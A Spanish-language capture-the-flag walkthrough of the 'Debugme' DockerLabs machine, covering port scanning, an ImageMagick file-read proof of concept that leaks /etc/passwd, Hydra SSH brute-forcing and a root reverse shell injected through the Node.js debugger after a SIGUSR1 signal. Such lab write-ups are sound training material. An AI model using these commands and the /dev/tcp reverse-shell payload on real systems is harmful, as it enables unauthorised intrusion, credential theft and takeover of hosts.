# Debugme DockerLabs (Hard)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip debugme.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh debugme.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 09:54 EST
Nmap scan report for ctf403.hl (172.17.0.2)
Host is up (0.000036s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:35:91:cf:5e:a7:19:b1:af:c9:f3:9e:0e:25:62:2e (RSA)
|   256 7e:c3:e4:b0:20:09:8f:4b:24:f7:cf:72:47:09:ab:b6 (ECDSA)
|_  256 89:89:11:91:38:6d:4f:1f:4f:ec:6c:eb:74:a1:ea:c3 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Redimensionar Imagen/PDF
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Redimensionar Imagen/PDF
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=*.vm/organizationName=Docker Boilerplate
| Not valid before: 2015-05-04T17:14:40
|_Not valid after:  2025-05-01T17:14:40
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds
```

Si nos metemos en la pagina tanto en el `80` como en el `443` vamos a ver la misma pagina, por lo que nos meteremos en el normal (`80`):

```
URL = http://<IP>/
```

Veremos un apartado en el que podremos subir una imagen con un tamaño personalizado, por lo que descargaremos una imagen y la subiremos, viendo algo asi:

<figure><img src="../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

Aparentemente no vemos nada, por lo que intentaremos `fuzzear` un poco por la web.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 2737]
/info.php             (Status: 200) [Size: 117988]
/server-status        (Status: 403) [Size: 275]
Progress: 102345 / 102350 (100.00%)
===============================================================
Finished
===============================================================
```

Por lo que vemos, podremos ver el `info.php`, si nos metemos dentro podremos ver varias extensiones instaladas, entre ellas una que llama mucho la atencion llamada `imagick`:

<figure><img src="../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

Buscamos si hubiera alguna vulnerabilidad respecto a esta herramienta, ya que esta herramienta es la que gestiona el tema de las imagenes en la pagina web.

## Local File Inclusion Imagick

Vemos que hay un repositorio de `github` aprovechando un `LFI` de esta herramienta en versiones anteriores a la `7.1.0` y la version de esta herramienta es `3.4.3` por lo que podremos aprovechar esta vulnerabilidad.

URL = [GitHub Imagick LFI](https://github.com/Sybil-Scan/imagemagick-lfi-poc)

Por lo que nos clonaremos el repositorio a nuestro `kali` de la siguiente forma:

```shell
git clone https://github.com/Sybil-Scan/imagemagick-lfi-poc.git
cd imagemagick-lfi-poc/
```

Instalaremos lo necesario:

```shell
apt install cargo
```

Probaremos primero a ver el archivo `passwd`, lo haremos de la siguiente forma:

```shell
python3 generate.py -f /etc/passwd -o passwd.png
```

Info:

```
   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /etc/passwd
   [>] PoC PNG generated > passwd.png
```

Ahora lo que haremos con esta imagen generada como `passwd.png` sera subirlo a la pagina, una vez subido veremos algo asi:

<figure><img src="../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

Ahora nos descargaremos la imagen de la pagina y veremos el contenido de la imagen con la siguiente herramienta:

```shell
identify -verbose <IMGAGE_PAGE>
```

Info:

```
Image:
  Filename: Untitled.png
  Permissions: rw-rw-r--
  Format: PNG (Portable Network Graphics)
  Mime type: image/png
  Class: DirectClass
  Geometry: 300x300+0+0
  Units: Undefined
  Colorspace: sRGB
  Type: TrueColor
  Base type: Undefined
  Endianness: Undefined
  Depth: 8-bit
  Channel depth:
    red: 8-bit
    green: 8-bit
    blue: 8-bit
  Channel statistics:
    Pixels: 90000
    Red:
      min: 0  (0)
      max: 254 (0.996078)
      mean: 127 (0.498039)
      standard deviation: 73.612 (0.288675)
      kurtosis: -1.20008
      skewness: 3.82595e-12
      entropy: 0.991802
    Green:
      min: 0  (0)
      max: 255 (1)
      mean: 43.0023 (0.168636)
      standard deviation: 60.457 (0.237086)
      kurtosis: 0.718427
      skewness: 1.33229
      entropy: 0.605748
    Blue:
      min: 0  (0)
      max: 254 (0.996078)
      mean: 127 (0.498039)
      standard deviation: 73.612 (0.288675)
      kurtosis: -1.20008
      skewness: -1.65107e-12
      entropy: 0.991802
  Image statistics:
    Overall:
      min: 0  (0)
      max: 255 (1)
      mean: 99.0008 (0.388238)
      standard deviation: 69.227 (0.271478)
      kurtosis: -1.20696
      skewness: 0.298909
      entropy: 0.863118
  Rendering intent: Perceptual
  Gamma: 0.454545
  Chromaticity:
    red primary: (0.64,0.33,0.03)
    green primary: (0.3,0.6,0.1)
    blue primary: (0.15,0.06,0.79)
    white point: (0.3127,0.329,0.3583)
  Background color: white
  Border color: srgb(223,223,223)
  Matte color: grey74
  Transparent color: black
  Interlace: None
  Intensity: Undefined
  Compose: Over
  Page geometry: 300x300+0+0
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Orientation: Undefined
  Properties:
    date:create: 2024-12-19T15:35:45+00:00
    date:modify: 2024-12-19T15:35:32+00:00
    date:timestamp: 2024-12-19T15:36:11+00:00
    png:bKGD: chunk was found (see Background color, above)
    png:cHRM: chunk was found (see Chromaticity, above)
    png:IHDR.bit-depth-orig: 8
    png:IHDR.bit_depth: 8
    png:IHDR.color-type-orig: 2
    png:IHDR.color_type: 2 (Truecolor)
    png:IHDR.interlace_method: 0 (Not interlaced)
    png:IHDR.width,height: 300, 300
    png:text: 3 tEXt/zTXt/iTXt chunks were found
    png:tIME: 2024-12-19T15:35:16Z
    Raw profile type: 

    1297
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f7661722f72756e2f697263643a2f75
73722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e61747320
4275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69
622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36
353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f
7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e65
78697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a6170706c69636174696f
6e3a783a313030303a313030303a3a2f686f6d652f6170706c69636174696f6e3a2f6269
6e2f626173680a73797374656d642d6e6574776f726b3a783a3130313a3130343a737973
74656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374
656d642f6e657469663a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d
7265736f6c76653a783a3130323a3130353a73797374656d64205265736f6c7665722c2c
2c3a2f72756e2f73797374656d642f7265736f6c76653a2f7573722f7362696e2f6e6f6c
6f67696e0a6d6573736167656275733a783a3130333a3130363a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130343a363535
33343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a6c656e61
6d3a783a313030313a313030313a3a2f686f6d652f6c656e616d3a2f62696e2f62617368
0a

    signature: a7a1b91f76b74215cf38e1b8f5a29a3f87f8ec6ab8353458edf49083f8925a27
  Artifacts:
    filename: Untitled.png
    verbose: true
  Tainted: False
  Filesize: 2840B
  Number pixels: 90000
  Pixels per second: 41.1351MB
  User time: 0.000u
  Elapsed time: 0:01.002
  Version: ImageMagick 6.9.13-12 Q16 x86_64 18420 https://legacy.imagemagick.org
```

Y lo que nos interesa de toda esta informacion es el resultado del `passwd` que estara en `hexadecimal`:

```
1297726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f7661722f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a6170706c69636174696f6e3a783a313030303a313030303a3a2f686f6d652f6170706c69636174696f6e3a2f62696e2f626173680a73797374656d642d6e6574776f726b3a783a3130313a3130343a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d642f6e657469663a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130353a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d642f7265736f6c76653a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130363a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130343a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a6c656e616d3a783a313030313a313030313a3a2f686f6d652f6c656e616d3a2f62696e2f626173680a
```

Por lo que lo decodificaremos con el siguiente mini script que he creado:

> decoderHexa.py

```python
import sys
import re

def validate_hex_data(hex_data):
    """
    Valida y limpia la cadena hexadecimal.
    :param hex_data: Cadena en formato hexadecimal.
    :return: Cadena hexadecimal limpia o un error si no es válida.
    """
    # Eliminar espacios y saltos de línea.
    hex_data = re.sub(r'\s+', '', hex_data)
    if not re.fullmatch(r'[0-9a-fA-F]*', hex_data):
        raise ValueError("El archivo contiene caracteres no válidos para hexadecimal.")
    return hex_data

def hex_to_text(hex_data):
    """
    Convierte una cadena hexadecimal a texto plano.
    :param hex_data: Cadena en formato hexadecimal.
    :return: Cadena en texto plano.
    """
    try:
        # Decodifica el texto hexadecimal a bytes.
        byte_data = bytes.fromhex(hex_data)
        # Trata de convertir el contenido a texto usando 'utf-8' o 'latin-1'
        try:
            text = byte_data.decode('utf-8')
        except UnicodeDecodeError:
            # Si no puede decodificar en utf-8, intenta con latin-1 (que permite caracteres no válidos en utf-8)
            text = byte_data.decode('latin-1', errors='ignore')
        
        return text
    except Exception as e:
        raise ValueError(f"Error al convertir la cadena hexadecimal: {e}")

def main():
    """
    Función principal que lee el archivo y traduce el contenido hexadecimal.
    """
    if len(sys.argv) < 2:
        print("Uso: python3 decoderHexa.py <archivo_hexadecimal>")
        sys.exit(1)

    file_path = sys.argv[1]

    try:
        with open(file_path, 'r') as file:
            # Lee todo el contenido del archivo.
            hex_data = file.read()

        # Limpia y valida la cadena hexadecimal.
        clean_data = validate_hex_data(hex_data)

        # Convierte la cadena limpia a texto.
        translated_text = hex_to_text(clean_data)

        # Muestra el texto traducido.
        print("Texto traducido:\n")
        print(translated_text)

    except FileNotFoundError:
        print(f"Error: No se pudo encontrar el archivo '{file_path}'.")
    except ValueError as ve:
        print(f"Error de validación: {ve}")
    except Exception as e:
        print(f"Error inesperado: {e}")

if __name__ == "__main__":
    main()
```

Ahora ese codigo entero `hezadecimal` lo guardaremos en un archivo `.txt` y se lo pasaremos como parametro al la herramienta:

```shell
python3 decoderHexa.py <FILE>.txt
```

Info:

```
Texto traducido:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
application:x:1000:1000::/home/application:/bin/bash
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
lenam:x:1001:1001::/home/lenam:/bin/bash
```

Por lo que vemos ha funcionado todo correctamente, y podemos observar 2 usuarios con `bash`, por lo que intentaremos sacarle las credenciales alguno de los 2 usuarios con un ataque de fuerza bruta:

## Escalate user lenam

### Hydra

Antes del ataque de fuerza bruta crearemos un archivo con los 2 usuarios:

> users.txt

```
lenam
application
```

Y ahora si, realizaremos el ataque:

```shell
hydra -L users.txt -P <WORDLIST> ssh://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-19 10:57:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 28688798 login tries (l:2/p:14344399), ~448263 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 459.00 tries/min, 459 tries in 00:01h, 28688369 to do in 1041:42h, 34 active
[22][ssh] host: 172.17.0.2   login: lenam   password: loverboy
[STATUS] 4781531.00 tries/min, 14344593 tries in 00:03h, 14344249 to do in 00:03h, 20 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Vemos que sacamos las credenciales del usuario `lenam`, por lo que nos conectaremos por `ssh` con dichas credenciales:

```shell
ssh lenam@<IP>
```

Metemos como contraseña `loverboy` y veremos que estamos dentro.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for lenam on 6f51fd7a405b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lenam may run the following commands on 6f51fd7a405b:
    (ALL) /bin/kill
```

Vemos que podemos ejecutar como `root` el binario `kill`, por lo que haremos lo siguiente.

Si enumeramos los puertos que hay activos en el momento, veremos lo siguiente:

```shell
netstat -tuln
```

Info:

```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN 
```

Vemos que hay 2 puertos corriendo en local bastante interesantes:

```
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN
```

Si hacemos un `curl` al puerto `8000` para ver que contiene, veremos lo siguiente:

```shell
curl http://localhost:8000/
```

Info:

```
Hello World from nodejs.
```

Y si probamos en el otro puerto da un error, por lo que vemos esta corriendo una aplicacion `node.js` en el puerto `8000`.

Lo que podemos hacer es matar el proceso con `kill` en el puerto `8000` para que asi se reinicie y nos muestre el puerto de depuracion del propio `node.js` cuando se reinicie, que ha esto se le llama hacer una señal `SIGUSR1`, por lo que cuando intentemos detener el proceso, tendra como consecuencia el reinicio del mismo exponiendo el puerto de depuracion que viene por defecto en el puerto `9229` el cual podremos aprovechar para injectar codigo malicioso ya que este depurador interactua con el `node.js` en tiempo real a nivel de ejecuccion.

Primero identificaremos el proceso padre de `node` de la siguiente forma:

```shell
ps aux | grep node
```

Info:

```
root          54  0.0  0.3 922032 29576 ?        Sl   14:53   0:00 /usr/bin/node /index.js
lenam        937  0.0  0.0  13076  2432 pts/0    S+   16:44   0:00 grep --color=auto node
```

Vemos que tiene como `PID` el numero `54` en mi caso, por lo que haremos lo siguiente:

```shell
sudo kill -SIGUSR1 54
```

Una vez realizado este paso, si volvemos a enumerar los puertos, veremos lo siguiente:

```shell
netstat -tuln
```

Info:

```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:9229          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN
```

Vemos que el puerto `9229` esta abierto ahora, por lo que ahora podremos hacer lo siguiente.

```shell
node inspect 127.0.0.1:9229
```

Info:

```
debug>
```

Esto nos metera en una consola interactiva en el puerto de depuracion de `node`.

Por lo que nos crearemos una `reverse shell` como `root` de la siguiente forma, dentro del entorno de `node`, pondremos lo siguiente:

```shell
exec("process.mainModule.require('child_process').exec('bash -c \"/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\"')")
```

Antes de enviarlo nos pondremos a la escucha de la siguiente forma:

```shell
nc -lvnp <PORT>
```

Una vez enviado, si nos vamos a donde teniamos la escucha veremos que hemos obtenido la shell como `root`:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 48278
bash: cannot set terminal process group (59): Inappropriate ioctl for device
bash: no job control in this shell
root@7d21a33a23a9:/# 
```

Por lo que ya seremos `root` y habremos terminado la maquina.
